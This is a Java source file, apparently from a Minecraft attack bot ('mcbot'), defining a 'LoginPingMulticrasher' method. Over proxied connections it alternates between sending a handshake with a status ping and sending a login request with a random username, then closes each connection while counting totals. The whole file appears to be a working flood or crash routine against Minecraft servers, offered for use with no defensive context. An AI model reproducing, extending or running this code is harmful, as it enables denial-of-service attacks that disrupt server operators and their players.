package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;
import xyz.mcbot.minecraftutils.Handshake;
import xyz.mcbot.minecraftutils.LoginRequest;
import xyz.mcbot.minecraftutils.PingPacket;

public class LoginPingMulticrasher implements Method
{
  private Handshake handshake;
  private byte[] handshakebytes;
  private byte[] bytes;
  
  private String randomString(int len)
  {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(targetStringLength);
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + 
        (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    }
    return buffer.toString();
  }
  
  public LoginPingMulticrasher() {
    handshakebytes = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 1).getWrappedPacket();
    handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    bytes = handshake.getWrappedPacket();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    long seconds = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis());
    if (seconds % 2L > 0L) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(handshakebytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1 }));
      channel.writeAndFlush(Unpooled.buffer().writeBytes(new PingPacket(System.currentTimeMillis()).getWrappedPacket()));
    } else {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes(new LoginRequest(randomString(14)).getWrappedPacket()));
    }
    NettyBootstrap.totalConnections += 1;
    NettyBootstrap.integer += 1;
    channel.close();
  }
}